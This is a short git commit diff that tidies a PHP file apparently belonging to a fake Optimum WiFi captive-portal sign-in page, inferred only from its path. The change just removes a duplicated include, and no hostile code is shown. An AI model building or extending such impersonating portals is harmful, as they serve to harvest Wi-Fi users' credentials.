58003af165699df30c98170e0ef473cbafd74c68
H4xl0r <31049432+H4xl0r@users.noreply.github.com>
2019-03-25 16:12:13 +0100

    Update signince44.php

--- portals/optimumwifi/signince44.php
+++ portals/optimumwifi/signince44.php
@@ -1,5 +1,5 @@
 <?php
-$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";require_once('helper.php');
+$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 require_once('helper.php');
 ?>
 
